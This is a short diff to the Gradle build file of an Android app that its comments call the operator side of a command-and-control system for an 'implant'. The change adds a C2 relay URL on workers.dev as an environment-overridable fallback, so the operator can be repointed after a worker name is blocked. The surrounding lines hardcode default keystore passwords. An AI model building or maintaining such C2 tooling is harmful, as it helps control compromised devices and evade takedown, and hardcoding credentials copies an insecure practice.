@@ -17,11 +17,19 @@ android {
 
         // Operator Ed25519 private key for signing RPC commands
         buildConfigField("String", "OPERATOR_PRIV_KEY", "\"${System.getenv("OPERATOR_PRIV_KEY") ?: ""}\"")
+
+        // C2 endpoint. Env-overridable so the operator can be repointed at a live
+        // worker without a source edit — the implant already works this way
+        // (C2_DOMAIN). Leaving it hardcoded is how the operator ended up baked
+        // against a dead/blocked worker name while the implant moved on.
+        buildConfigField("String", "WORKER_URL", "\"${System.getenv("WORKER_URL") ?: "https://cfg-relay.marwannaili-23-07.workers.dev"}\"")
     }
 
     signingConfigs {
         create("release") {
             storeFile = file(System.getenv("OPERATOR_KEYSTORE_PATH") ?: "../keystore/operator.jks")
+            // Explicit: Gradle defaults to JKS and fails on PKCS12 bytes.
+            storeType = System.getenv("OPERATOR_KEYSTORE_TYPE") ?: "PKCS12"
             storePassword = System.getenv("OPERATOR_KEYSTORE_PASS") ?: "ShadowOperator2024!"
             keyAlias = System.getenv("OPERATOR_KEY_ALIAS") ?: "shadow_operator"
             keyPassword = System.getenv("OPERATOR_KEY_PASS") ?: "ShadowOperator2024!"
